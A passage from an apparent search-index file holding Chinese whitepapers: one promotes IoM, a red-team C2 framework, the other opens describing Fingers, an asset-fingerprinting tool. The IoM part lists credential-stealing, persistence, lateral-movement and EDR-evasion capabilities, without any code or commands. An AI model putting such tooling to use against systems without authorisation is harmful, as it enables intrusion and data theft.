\u5e26\u6765\u7684\u6027\u80fd\u63d0\u5347\u548c\u529f\u80fd\u6269\u5c55\u3002\u901a\u8fc7\u964d\u4f4e\u8fc1\u79fb\u6210\u672c\u5e76\u63d0\u4f9b\u7075\u6d3b\u7684\u96c6\u6210\u65b9\u5f0f\uff0cIoM \u4e3a\u7528\u6237\u6253\u9020\u4e86\u4e00\u4e2a\u9ad8\u6548\u3001\u6613\u7528\u7684\u751f\u6001\u534f\u4f5c\u5e73\u53f0\u3002</p> <p>IoM\u8fc1\u79fb\u4e86\u5927\u91cfCobaltStrike\u7684\u5e38\u7528\u5de5\u5177\u96c6, \u5e76\u5c01\u88c5\u4e3amals\u63d2\u4ef6\u5305\uff0c\u4e00\u952e\u4e0b\u8f7d\u5b89\u88c5\u3002</p> <ul> <li>lib , \u5305\u542b\u591a\u79cd\u901a\u7528\u52a0\u8f7d\u5668\u3001 UDRL\u7b49</li> <li>commom (\u57fa\u7840\u5de5\u5177\u5305) , \u5305\u542b\u5927\u91cf\u626b\u63cf\u5de5\u5177\u3001\u7206\u7834\u5de5\u5177\u3001\u4fe1\u606f\u6536\u96c6\u5de5\u5177</li> <li>steal (\u51ed\u8bc1\u63d0\u53d6\u5de5\u5177\u5305), \u5305\u542b browser\u3001keylogger\u3001screenshot\u3001clipboard\u3001\u5404\u7c7bapp\u7b49</li> <li>elevate (\u63d0\u6743\u5de5\u5177\u5305), \u5305\u542b\u5927\u91cf\u63d0\u6743, UAC\u7ed5\u8fc7\u3001\u6743\u9650\u64cd\u4f5c\u5de5\u5177</li> <li>persistence (\u6743\u9650\u7ef4\u6301\u5de5\u5177\u5305), \u5305\u542b\u5927\u91cf\u6743\u9650\u7ef4\u6301\u3001\u81ea\u542f\u5de5\u5177</li> <li>move (\u6a2a\u5411\u79fb\u52a8\u5de5\u5177\u5305), \u5305\u542b\u5927\u91cfSMB\u3001WMI\u3001WINRM\u3001DCOM\u3001RPC\u6a2a\u5411\u79fb\u52a8\u5de5\u5177</li> <li>proxy (\u7f51\u7edc\u5de5\u5177\u5305), \u5305\u542b\u5927\u91cf\u4ee3\u7406\u3001\u96a7\u9053\u5de5\u5177\u5305</li> <li>domain (\u57df\u6e17\u900f\u5de5\u5177\u5305)\uff0c\u5305\u542b\u5927\u91cf\u57df\u5185\u4fe1\u606f\u6536\u96c6\u3001\u63d0\u6743\u3001\u6743\u9650\u7ef4\u6301\u3001\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u5305</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u7ade\u4e89\u4f18\u52bf","title":"\u7ade\u4e89\u4f18\u52bf","text":"<ul> <li>\u67b6\u6784\u521b\u65b0     IoM\u91c7\u7528Rust\u8bed\u8a00\u5f00\u53d1\uff0c\u5229\u7528\u5176\u5185\u5b58\u5b89\u5168\u6027\u548c\u8de8\u5e73\u53f0\u7f16\u8bd1\u80fd\u529b\uff0c\u786e\u4fdd\u4e86\u5de5\u5177\u7684\u9ad8\u6548\u6027\u4e0e\u7a33\u5b9a\u6027\u3002\u540c\u65f6\uff0cIoM\u5f15\u5165\u6a21\u5757\u5316\u8bbe\u8ba1\u548c\u52a8\u6001\u52a0\u8f7d\u673a\u5236\uff0c\u7528\u6237\u53ef\u6839\u636e\u9700\u6c42\u7075\u6d3b\u5b9a\u5236\u529f\u80fd\uff0c\u663e\u8457\u63d0\u5347\u4e86\u5de5\u5177\u7684\u9002\u5e94\u6027\u3002\u4ee5\u53ca\u5206\u5e03\u5f0fListener\u7b49\u7b49\u5927\u91cf\u72ec\u6709\u521b\u65b0\u70b9\u3002</li> <li>\u529f\u80fd\u4f18\u52bf     IoM\u901a\u8fc7OPSEC\uff08\u64cd\u4f5c\u5b89\u5168\uff09\u6a21\u578b\u548c\u591a\u9636\u6bb5\u52a0\u8f7d\u6280\u672f\uff0c\u5927\u5e45\u589e\u5f3a\u4e86\u64cd\u4f5c\u7684\u9690\u853d\u6027\uff0c\u6709\u6548\u964d\u4f4e\u4e86\u88ab\u68c0\u6d4b\u7684\u98ce\u9669\u3002\u6b64\u5916\uff0cIoM\u652f\u6301\u4e0e\u73b0\u6709\u5de5\u5177\u7684\u65e0\u7f1d\u96c6\u6210\uff0c\u7528\u6237\u65e0\u9700\u5927\u5e45\u8c03\u6574\u73b0\u6709\u5de5\u4f5c\u6d41\u7a0b\u5373\u53ef\u8fc1\u79fb\u81f3IoM\u3002</li> <li>\u56fd\u4ea7\u53ef\u9760     IoM\u7edd\u5927\u90e8\u5206\u4ee3\u7801\u90fd\u5728github\u5e73\u53f0\u4e0a\u5f00\u6e90\uff0c \u4ee5\u4f9b\u4e8c\u6b21\u5f00\u53d1\u4e0e\u5ba1\u8ba1\u3002\u90e8\u5206OPSEC\u76f8\u5173\u7684\u529f\u80fd\u4e0d\u5f00\u6e90\uff0c \u7528\u4ee5\u5b9e\u73b0\u4e0d\u5bf9\u79f0\u5bf9\u6297\u3002 </li> </ul> <p>IoM\u4e3b\u8981\u9762\u5411\u4f01\u4e1a\u84dd\u519b\u3001\u5b89\u5168\u7814\u7a76\u4eba\u5458\u548c\u7ea2\u961f\u6210\u5458\uff0c\u81f4\u529b\u4e8e\u4e3a\u4ed6\u4eec\u63d0\u4f9b\u4e00\u5957\u9ad8\u6548\u3001\u9690\u853d\u4e14\u6613\u4e8e\u6269\u5c55\u7684\u7f51\u7edc\u5b89\u5168\u5de5\u5177\u3002\u901a\u8fc7\u7ed3\u5408\u5f00\u6e90\u793e\u533a\u7684\u534f\u4f5c\u4e0e\u4e13\u4e1a\u6280\u672f\u652f\u6301\uff0cIoM\u5c06\u6301\u7eed\u8fed\u4ee3\uff0c\u6ee1\u8db3\u7528\u6237\u5728\u52a8\u6001\u5b89\u5168\u73af\u5883\u4e2d\u7684\u591a\u6837\u5316\u9700\u6c42\u3002</p>"},{"location":"blog/whitepaper/IoM/#\u5e94\u7528\u573a\u666f","title":"\u5e94\u7528\u573a\u666f","text":"<p>IoM \u7684\u8bbe\u8ba1\u4f7f\u5176\u9002\u7528\u4e8e\u591a\u79cd\u4f01\u4e1a\u7f51\u7edc\u5b89\u5168\u573a\u666f\uff1a</p> <ol> <li>\u6e17\u900f\u6d4b\u8bd5     \u6a21\u62df\u771f\u5b9e\u653b\u51fb\u8def\u5f84\uff0c\u6d4b\u8bd5\u9632\u706b\u5899\u3001EDR \u548c SIEM \u7684\u68c0\u6d4b\u80fd\u529b\u3002</li> <li>\u7ea2\u961f\u6f14\u7ec3     \u6267\u884c\u9ad8\u7ea7\u5a01\u80c1\u6a21\u62df\uff0c\u8bc4\u4f30\u7ec4\u7ec7\u7684\u5e94\u6025\u54cd\u5e94\u548c\u7eb5\u6df1\u9632\u5fa1\u80fd\u529b\u3002</li> <li>\u5b89\u5168\u7814\u7a76     \u63d0\u4f9b\u7075\u6d3b\u7684\u5b9e\u9a8c\u5e73\u53f0\uff0c\u7528\u4e8e\u5f00\u53d1\u548c\u9a8c\u8bc1\u65b0\u7684\u653b\u51fb\u6280\u672f\u4e0e\u9632\u5fa1\u7b56\u7565\u3002</li> <li>\u84dd\u519b\u80fd\u529b\u5efa\u8bbe     \u4e3a\u4f01\u4e1a\u84dd\u519b\u63d0\u4f9b\u6807\u51c6\u5316\u7684\u5de5\u5177\u96c6\uff0c\u63d0\u5347\u5185\u90e8\u653b\u9632\u6f14\u7ec3\u7684\u6548\u7387\u548c\u6548\u679c\u3002</li> <li>\u6559\u80b2\u4e0e\u57f9\u8bad     IoM\u5982\u4f55\u5728\u5b89\u5168\u57f9\u8bad\u4e2d\u5e2e\u52a9\u4ece\u4e1a\u4eba\u5458\u7406\u89e3\u9ad8\u7ea7\u5a01\u80c1\u7684\u884c\u4e3a\u6a21\u5f0f\u3002</li> </ol>"},{"location":"blog/whitepaper/IoM/#\u91cc\u7a0b\u7891","title":"\u91cc\u7a0b\u7891","text":"\u7248\u672c \u6807\u9898 \u91cd\u70b9\u80fd\u529b v0.0.1 \u4e00\u4e0b\u4ee3C2\u8ba1\u5212 \u57fa\u672c\u67b6\u6784\u642d\u5efa\u3001\u8bbe\u8ba1\u7406\u5ff5\u5b9e\u8df5 v0.0.2 \u771f\u6b63\u7684\u5f00\u59cb Client\u63d2\u4ef6\u6846\u67b6\u3001\u65e0\u6587\u4ef6\u653b\u51fb\u3001\u81ea\u52a8\u5316\u7f16\u8bd1 v0.0.3 \u771f\u6b63\u610f\u4e49\u4e0a\u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd\u4e0eC2\u6846\u67b6 Implant\u91cd\u6784\u3001\u591a\u9636\u6bb5\u52a0\u8f7d\u3001 SRDI\u3001\u63d2\u4ef6\u7cfb\u7edf\u5b8c\u5584\u3001OPSEC\u6a21\u578b\u3001\u534f\u8bae\u89e3\u8026\u3001\u5927\u91cf\u65b0\u6a21\u5757... v0.0.4 \u81ea\u4e3e \u65b0\u7684\u81ea\u52a8\u5316\u7f16\u8bd1\u65b9\u5f0f\u3001\u64cd\u4f5c\u7cfb\u7edf\u517c\u5bb9\u6027\u63d0\u5347\u3001Client\u4f18\u5316...... v0.1.0 \u4ee3\u66ffCobaltStrike\u7684\u6700\u540e\u56db\u5757\u62fc\u56fe OLLVM\u843d\u5730\u3001\u5168\u9762\u5b9e\u73b0\u5404\u79cd\u4ee3\u7406\u96a7\u9053\u3001GUI\u3001\u63d2\u4ef6\u7cfb\u7edf\u6b63\u5f0f\u7248\u3001\u4e09\u7aef\u7f51\u7edc\u8054\u901a\u3001\u514d\u6740\u81ea\u52a8\u5316...... v0.1.1 \u5f00\u7bb1\u5373\u7528 SaaS\u81ea\u52a8\u5316\u7f16\u8bd1\u3001\u5185\u7f6emal\u63d2\u4ef6\u5408\u96c6\u3001implant transport\u91cd\u6784 ... \u672a\u6765\u7248\u672c\u5c06\u8fdb\u4e00\u6b65\u4f18\u5316GUI\u754c\u9762\u3001\u589e\u5f3a\u81ea\u52a8\u5316\u514d\u6740\u80fd\u529b\uff0c\u5e76\u5f15\u5165\u66f4\u591a\u9ad8\u7ea7OPSEC\u7279\u6027\uff0c\u5982\u57fa\u4e8eOLLVM\u7684\u7f16\u8bd1\u65f6\u6df7\u6dc6\u548cLinux\u5e73\u53f0\u7684\u5168\u9762\u652f\u6301\u3002"},{"location":"blog/whitepaper/IoM/#\u53ef\u5b9a\u5236\u5316\u7684\u7ef4\u5ea6","title":"\u53ef\u5b9a\u5236\u5316\u7684\u7ef4\u5ea6","text":"<p>IoM \u63d0\u4f9b\u4e86\u591a\u7ef4\u5ea6\u7684\u5546\u4e1a\u53ef\u5b9a\u5236\u5316\u80fd\u529b\uff0c\u4ee5\u6ee1\u8db3\u7528\u6237\u5728\u4e0d\u540c\u573a\u666f\u4e0b\u7684\u9700\u6c42\u3002\u4ee5\u4e0b\u662f\u5176\u6838\u5fc3\u529f\u80fd\u4e0b\u53ef\u5b9a\u5236\u5316\u7684\u5177\u4f53\u7ef4\u5ea6\uff1a</p>"},{"location":"blog/whitepaper/IoM/#edr\u6740\u8f6f\u5bf9\u6297","title":"EDR/\u6740\u8f6f\u5bf9\u6297","text":"<ul> <li>\u5185\u5b58\u65e0\u6587\u4ef6\u6267\u884c\uff1a\u81ea\u5b9a\u4e49PE\u6587\u4ef6\u52a0\u8f7d\u5668\u3001BOF\u52a0\u8f7d\u5668\u7279\u5f81\u3002 </li> <li>\u7cfb\u7edf\u8c03\u7528\uff1a\u5b9a\u5236\u5806\u6808\u6df7\u6dc6\uff0csyscall \u5b9e\u73b0\u65b9\u5f0f\u3002</li> <li>\u4ee3\u7801\u6df7\u6dc6\uff1a\u5b9a\u5236\u57fa\u4e8eollvm\u4e0erust\u7279\u6027\u5b9e\u73b0\u7684\u7f16\u8bd1\u65f6\u81ea\u52a8\u6df7\u6dc6\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u6d41\u91cf\u7279\u5f81","title":"\u6d41\u91cf\u7279\u5f81","text":"<ul> <li>\u81ea\u5b9a\u4e49\u901a\u4fe1\u534f\u8bae\uff1aIoM \u652f\u6301\u591a\u79cd\u901a\u4fe1\u534f\u8bae\uff08\u5982 HTTP\u3001TCP\u3001DNS \u7b49\uff09\uff0c\u5e76\u5141\u8bb8\u7528\u6237\u6839\u636e\u9700\u6c42\u9009\u62e9\u6216\u81ea\u5b9a\u4e49\u534f\u8bae\uff0c\u3002</li> <li>lolC2: \u652f\u6301 lolc2\u3002</li> <li>\u6d41\u91cf\u6df7\u6dc6\uff1a\u652f\u6301\u5b9a\u5236\u6d41\u91cf\u52a0\u5bc6\u65b9\u5f0f\u4e0e\u6df7\u6dc6\u65b9\u5f0f\u3002 </li> </ul>"},{"location":"blog/whitepaper/IoM/#\u8bbe\u5907\u517c\u5bb9\u4e0e\u63d2\u4ef6\u5305","title":"\u8bbe\u5907\u517c\u5bb9\u4e0e\u63d2\u4ef6\u5305","text":"<ul> <li>\u8de8\u5e73\u53f0\u652f\u6301\uff1a\u5229\u7528 Rust \u8bed\u8a00\u7684\u8de8\u5e73\u53f0\u7f16\u8bd1\u80fd\u529b\uff0cIoM \u53ef\u5728\u591a\u79cd IoT \u8bbe\u5907\u4e0a\u90e8\u7f72\uff0c\u652f\u6301\u5305\u62ec ARM\u3001MIPS \u7b49\u67b6\u6784\uff0c\u53ef\u5b9a\u5236\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u517c\u5bb9\u3002</li> <li>\u5b9a\u5236\u6a21\u5757\uff1a\u5b9a\u5236implant\u7aef\u7684module\uff0c\u4f8b\u5982stealer\u3001\u6743\u9650\u7ef4\u6301\u7b49\u3002</li> <li>\u5b9a\u5236\u63d2\u4ef6\u5305\uff1a\u53ef\u4ee5\u57fa\u4e8e\u6307\u5b9a\u573a\u666f\u4e0e\u9700\u6c42\u5b9a\u5411\u5f00\u53d1mals\u63d2\u4ef6\u5305\u3002</li> </ul>"},{"location":"blog/whitepaper/IoM/#\u6cd5\u5f8b\u4e0e\u5408\u89c4\u6027","title":"\u6cd5\u5f8b\u4e0e\u5408\u89c4\u6027","text":""},{"location":"blog/whitepaper/IoM/#\u4f7f\u7528\u8bb8\u53ef","title":"\u4f7f\u7528\u8bb8\u53ef","text":"<p>IoM\u91c7\u7528 Apache 2.0\u5f00\u6e90\u8bb8\u53ef\uff0c\u7528\u6237\u53ef\u5728\u9075\u5b88\u8bb8\u53ef\u534f\u8bae\u7684\u524d\u63d0\u4e0b\u81ea\u7531\u4f7f\u7528\u3001\u4fee\u6539\u548c\u5206\u53d1\u5de5\u5177\u3002\u7136\u800c\uff0c\u7528\u6237\u5728\u4f7f\u7528IoM\u65f6\uff0c\u5fc5\u987b\u786e\u4fdd\u5176\u884c\u4e3a\u7b26\u5408\u6240\u5728\u56fd\u5bb6\u6216\u5730\u533a\u7684\u6cd5\u5f8b\u6cd5\u89c4\u3002\u4efb\u4f55\u672a\u7ecf\u6388\u6743\u6216\u975e\u6cd5\u4f7f\u7528IoM\u7684\u884c\u4e3a\u5747\u4e0d\u5728\u8bb8\u53ef\u8303\u56f4\u4e4b\u5185\u3002</p>"},{"location":"blog/whitepaper/IoM/#\u5408\u89c4\u6027\u58f0\u660e","title":"\u5408\u89c4\u6027\u58f0\u660e","text":"<p>IoM\u7684\u8bbe\u8ba1\u548c\u5f00\u53d1\u4e25\u683c\u9075\u5b88\u7f51\u7edc\u5b89\u5168\u9886\u57df\u7684\u76f8\u5173\u6cd5\u5f8b\u6cd5\u89c4\u3002\u5de5\u5177\u7684\u521d\u8877\u662f\u4e3a\u5408\u6cd5\u7684\u5b89\u5168\u6d4b\u8bd5\u548c\u7814\u7a76\u63d0\u4f9b\u652f\u6301\uff0c\u660e\u786e\u7981\u6b62\u5c06\u5176\u7528\u4e8e\u4efb\u4f55\u975e\u6cd5\u6d3b\u52a8\u3002IoM\u5f00\u53d1\u56e2\u961f\u4e0d\u5bf9\u7528\u6237\u5728\u4f7f\u7528\u5de5\u5177\u65f6\u53ef\u80fd\u5f15\u53d1\u7684\u6cd5\u5f8b\u540e\u679c\u627f\u62c5\u8d23\u4efb\u3002\u7528\u6237\u5e94\u81ea\u884c\u8bc4\u4f30\u5176\u4f7f\u7528\u573a\u666f\u7684\u5408\u6cd5\u6027\uff0c\u5e76\u627f\u62c5\u76f8\u5e94\u4e49\u52a1\u3002</p>"},{"location":"blog/whitepaper/IoM/#\u9053\u5fb7\u4f7f\u7528","title":"\u9053\u5fb7\u4f7f\u7528","text":"<p>IoM\u9f13\u52b1\u7528\u6237\u5728\u5b89\u5168\u6d4b\u8bd5\u548c\u7814\u7a76\u4e2d\u9075\u5faa\u9053\u5fb7\u51c6\u5219\uff0c\u786e\u4fdd\u5de5\u5177\u7684\u4f7f\u7528\u4e0d\u4f1a\u5bf9\u4ed6\u4eba\u6216\u7ec4\u7ec7\u9020\u6210\u4e0d\u5fc5\u8981\u7684\u635f\u5bb3\u3002\u4f7f\u7528IoM\u65f6\uff0c\u7528\u6237\u5e94\u4e8b\u5148\u83b7\u5f97\u76f8\u5173\u6388\u6743\uff0c\u5e76\u5728\u64cd\u4f5c\u4e2d\u9075\u5b88\u804c\u4e1a\u9053\u5fb7\u548c\u884c\u4e1a\u89c4\u8303\u3002\u901a\u8fc7\u5408\u6cd5\u3001\u900f\u660e\u7684\u4f7f\u7528\u65b9\u5f0f\uff0cIoM\u65e8\u5728\u4e3a\u7f51\u7edc\u5b89\u5168\u793e\u533a\u63d0\u4f9b\u6b63\u5411\u4ef7\u503c\u3002</p>"},{"location":"blog/whitepaper/IoM/#\u7ed3\u8bed","title":"\u7ed3\u8bed","text":"<p>Internet of Malice (IoM) \u662f\u4e00\u6b3e\u9762\u5411\u4f01\u4e1a\u84dd\u519b\u7684\u65b0\u4e00\u4ee3\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\uff0c\u901a\u8fc7\u5176\u6a21\u5757\u5316\u8bbe\u8ba1\u3001\u5f3a\u5927\u7684 OPSEC \u6a21\u578b\u548c\u5e7f\u6cdb\u7684\u751f\u6001\u517c\u5bb9\u6027\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u6a21\u62df\u9ad8\u7ea7\u5a01\u80c1\u7684\u5168\u9762\u5de5\u5177\u96c6\u3002\u65e0\u8bba\u662f\u6e17\u900f\u6d4b\u8bd5\u3001\u7ea2\u961f\u64cd\u4f5c\u8fd8\u662f\u5b89\u5168\u7814\u7a76\uff0cIoM \u90fd\u80fd\u5e2e\u52a9\u4f01\u4e1a\u63d0\u5347\u7f51\u7edc\u5b89\u5168\u80fd\u529b\uff0c\u66f4\u597d\u5730\u5e94\u5bf9\u65e5\u76ca\u590d\u6742\u7684\u5a01\u80c1\u73af\u5883\u3002</p> <p>\u6211\u4eec\u76f8\u4fe1\uff0c\u8fdb\u653b\u662f\u6700\u597d\u7684\u9632\u5fa1\u3002IoM \u5c06\u6210\u4e3a\u4f01\u4e1a\u84dd\u519b\u4e0d\u53ef\u6216\u7f3a\u7684\u6218\u7565\u8d44\u4ea7\uff0c\u52a9\u529b\u7ec4\u7ec7\u5728\u7f51\u7edc\u653b\u9632\u5bf9\u6297\u4e2d\u5360\u636e\u4e3b\u52a8\u3002</p> <p>IoM\u5c06\u6301\u7eed\u8fed\u4ee3\uff0c\u4f9d\u6258\u5f00\u6e90\u793e\u533a\u548c\u4e13\u4e1a\u652f\u6301\uff0c\u4e3a\u4f01\u4e1a\u84dd\u519b\u63d0\u4f9b\u6700\u524d\u6cbf\u7684\u8fdb\u653b\u6027\u5de5\u5177\u548c\u6280\u672f\u652f\u6301\uff0c\u52a9\u529b\u6784\u5efa\u9002\u5e94\u672a\u6765\u5a01\u80c1\u7684\u7f51\u7edc\u5b89\u5168\u80fd\u529b\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/","title":"Fingers \u591a\u5f15\u64ce\u6307\u7eb9\u8bc6\u522b\u7cfb\u7edf\u767d\u76ae\u4e66","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u5728\u73b0\u4ee3\u7f51\u7edc\u5b89\u5168\u8bc4\u4f30\u548c\u653b\u51fb\u9762\u7ba1\u7406\u4e2d\uff0c\u7cbe\u786e\u7684\u8d44\u4ea7\u8bc6\u522b\u662f\u6210\u529f\u5b9e\u65bd\u5b89\u5168\u7b56\u7565\u7684\u57fa\u7840\u3002\u4f20\u7edf\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u5f80\u5f80\u53d7\u9650\u4e8e\u5355\u4e00\u89c4\u5219\u5e93\u7684\u8986\u76d6\u8303\u56f4\uff0c\u9762\u4e34\u8bef\u62a5\u7387\u9ad8\u3001\u6f0f\u62a5\u4e25\u91cd\u3001\u66f4\u65b0\u6ede\u540e\u7b49\u95ee\u9898\u3002**Fingers \u591a\u5f15\u64ce\u6307\u7eb9\u8bc6\u522b\u7cfb\u7edf**\u5e94\u8fd0\u800c\u751f\uff0c\u4f5c\u4e3a\u4e00\u5957\u4e13\u4e3a\u73b0\u4ee3\u5b89\u5168\u573a\u666f\u8bbe\u8ba1\u7684\u4e0b\u4e00\u4ee3\u6307\u7eb9\u8bc6\u522b\u57fa\u7840\u8bbe\u65bd\u3002</p> <p>Fingers \u7684\u6838\u5fc3\u4ef7\u503c\u4f53\u73b0\u5728\u4e09\u4e2a\u5173\u952e\u7ef4\u5ea6\uff1a**\u5d4c\u5165\u5f0f\u67b6\u6784**\u4f7f\u5176\u80fd\u591f\u65e0\u7f1d\u96c6\u6210\u5230\u4efb\u4f55\u5b89\u5168\u5de5\u5177\u4e2d\uff0c\u63d0\u4f9b\u6781\u9ad8\u6548\u7387\u7684API\u8c03\u7528\uff1b**\u573a\u666f\u5316\u89e3\u51b3\u65b9\u6848**\u4e0d\u4ec5\u63d0\u4f9b\u5e95\u5c42\u6307\u7eb9\u8bc6\u522b\u80fd\u529b\uff0c\u66f4\u9488\u5bf9\u7aef\u53e3\u626b\u63cf\u548c\u76ee\u5f55\u7206\u7834\u7b49\u5b9e\u6218\u573a\u666f\u63d0\u4f9b\u5b8c\u6574\u89e3\u51b3\u65b9\u6848\uff1b**\u5f00\u653e\u751f\u6001\u7cfb\u7edf**\u901a\u8fc7\u7ee7\u627f\u591a\u793e\u533a\u6307\u7eb9\u5e93\u5e76\u652f\u6301\u7b2c\u4e09\u65b9\u6269\u5c55\uff0c\u6784\u5efa\u4e86\u4e1a\u754c\u6700\u5b8c\u6574\u7684\u6307\u7eb9\u8bc6\u522b\u751f\u6001\u3002</p> <p>\u672c\u7cfb\u7edf\u901a\u8fc7\u591a\u5f15\u64ce\u878d\u5408\u67b6\u6784\uff0c\u5b9e\u73b0\u4e86\u4e00\u6b21\u626b\u63cf\u591a\u5e93\u5339\u914d\u7684\u521b\u65b0\u6a21\u5f0f\uff0c\u6700\u5927\u7a0b\u5ea6\u63d0\u5347\u4e86\u6307\u7eb9\u8bc6\u522b\u7684\u51c6\u786e\u6027\u548c\u8986\u76d6\u8303\u56f4\uff0c\u4e3a\u73b0\u4ee3\u5b89\u5168\u5de5\u5177\u63d0\u4f9b\u4e86\u5f3a\u5927\u800c\u7075\u6d3b\u7684\u6307\u7eb9\u8bc6\u522b\u57fa\u7840\u8bbe\u65bd\u3002</p>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u80cc\u666f\u4e0e\u5e02\u573a\u9700\u6c42","title":"\u80cc\u666f\u4e0e\u5e02\u573a\u9700\u6c42","text":""},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u6307\u7eb9\u8bc6\u522b\u9762\u4e34\u7684\u6311\u6218","title":"\u6307\u7eb9\u8bc6\u522b\u9762\u4e34\u7684\u6311\u6218","text":"<p>\u73b0\u4ee3\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u4f01\u4e1a\u9762\u4e34\u7740\u65e5\u76ca\u590d\u6742\u7684IT\u57fa\u7840\u8bbe\u65bd\u548c\u591a\u6837\u5316\u7684\u5e94\u7528\u7cfb\u7edf\u3002\u4f20\u7edf\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u5728\u5e94\u5bf9\u8fd9\u4e9b\u6311\u6218\u65f6\u66b4\u9732\u51fa\u4ee5\u4e0b\u95ee\u9898\uff1a</p> <ol> <li>\u8986\u76d6\u8303\u56f4\u6709\u9650\uff1a\u5355\u4e00\u6307\u7eb9\u5e93\u96be\u4ee5\u8986\u76d6\u6240\u6709\u7c7b\u578b\u7684\u5e94\u7528\u548c\u7cfb\u7edf\uff0c\u7279\u522b\u662f\u56fd\u4ea7\u5316\u5e94\u7528\u548c\u4f9b\u5e94\u94fe\u7cfb\u7edf\u3002</li> <li>\u66f4\u65b0\u6ede\u540e\uff1a\u65b0\u5174\u5e94\u7528\u548c\u7248\u672c\u66f4\u65b0\u901f\u5ea6\u8fdc\u8d85\u6307\u7eb9\u5e93\u7684\u7ef4\u62a4\u9891\u7387\u3002</li> <li>\u51c6\u786e\u6027\u4e0d\u8db3\uff1a\u8bef\u62a5\u548c\u6f0f\u62a5\u95ee\u9898\u4e25\u91cd\uff0c\u5f71\u54cd\u540e\u7eed\u5b89\u5168\u8bc4\u4f30\u7684\u6548\u679c\u3002</li> <li>\u6807\u51c6\u5316\u7f3a\u5931\uff1a\u4e0d\u540c\u6307\u7eb9\u5e93\u7684\u547d\u540d\u89c4\u8303\u4e0d\u7edf\u4e00\uff0c\u96be\u4ee5\u4e0e\u6f0f\u6d1e\u5e93\u8fdb\u884c\u6709\u6548\u5173\u8054\u3002</li> </ol>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u5f00\u6e90\u4e16\u754c\u7684\u73b0\u72b6","title":"\u5f00\u6e90\u4e16\u754c\u7684\u73b0\u72b6","text":"<p>\u5f00\u6e90\u6307\u7eb9\u8bc6\u522b\u9886\u57df\u5b58\u5728\u660e\u663e\u7684\u788e\u7247\u5316\u73b0\u8c61\uff1a</p> <ul> <li>nmap\uff1a\u62e5\u6709\u5f3a\u5927\u7684\u670d\u52a1\u6307\u7eb9\u80fd\u529b\uff0c\u4f46\u5728Web\u5e94\u7528\u8bc6\u522b\u65b9\u9762\u5b58\u5728\u77ed\u677f\uff0c\u4e14\u626b\u63cf\u901f\u5ea6\u8f83\u6162\u3002</li> <li>Wappalyzer\uff1a\u4e13\u6ce8\u4e8eWeb\u6280\u672f\u6808\u8bc6\u522b\uff0c\u8986\u76d6\u7ea64000\u4e2a\u5e94\u7528\uff0c\u4f46\u7f3a\u5c11\u56fd\u4ea7\u5316\u5e94\u7528\u652f\u6301\u3002</li> <li>EHole/FingerprintHub\uff1a\u9488\u5bf9\u56fd\u5185\u5e94\u7528\u4f18\u5316\uff0c\u4f46\u56fd\u9645\u5316\u8986\u76d6\u4e0d\u8db3\u3002</li> <li>\u5546\u4e1a\u5de5\u5177\uff1a\u5982Goby\u7b49\u5de5\u5177\u62e5\u6709\u4e30\u5bcc\u7684\u6307\u7eb9\u5e93\uff0c\u4f46\u89c4\u5219\u4e0d\u5f00\u653e\uff0c\u96be\u4ee5\u5b9a\u5236\u3002</li> </ul>"},{"location":"blog/whitepaper/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u4f01\u4e1a\u9700\u6c42\u5206\u6790","title":"\u4f01\u4e1a\u9700\u6c42\u5206\u6790","text":"<p>\u73b0\u4ee3\u4f01\u4e1a\u5728\u6307\u7eb9\u8bc6\u522b\u65b9\u9762\u7684\u6838\u5fc3\u9700\u6c42\u5305\u62ec\uff1a</p> <ul> <li>\u5168\u9762\u8986\u76d6\uff1a\u652f\u6301Web\u5e94\u7528\u3001\u4e2d\u95f4\u4ef6\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u7f51\u7edc\u8bbe\u5907\u7b49\u5168\u6808\u8d44\u4ea7\u8bc6\u522b\u3002</li> <li>\u9ad8\u7cbe\u5ea6\u8bc6\u522b\uff1a\u51c6\u786e\u63d0\u53d6\u7248\u672c\u4fe1\u606f\u3001\u4f9b\u5e94\u5546\u4fe1\u606f\u548c\u6280\u672f\u6808\u8be6\u60c5\u3002</li> <li>\u5b9e\u65f6\u66f4\u65b0\uff1a\u5feb\u901f\u8ddf\u8fdb\u65b0\u5174\u6280\u672f\u548c\u5b89\u5168\u5a01\u80c1\u3002</li> <li>\u6807\u51c6\u5316\u8f93\u51fa\uff1a\u652f\u6301\u4e0e\u73b0\u6709\u5b89\u5168\u5de5\u5177\u548c\u7ba1\u7406\u7cfb\u7edf\u7684\u65e0\u7f1d\u96c6\u6210\u3002</li> <li>\u9ad8\u6027\u80fd\u5904\u7406\uff1a\u652f\u6301\u5927\u89c4\u6a21\u5e76\u53d1\u626b\u63cf\u548c\u5206\u5e03\u5f0f\u90e8\u7f72\u3002</li> </ul> <p>Fingers 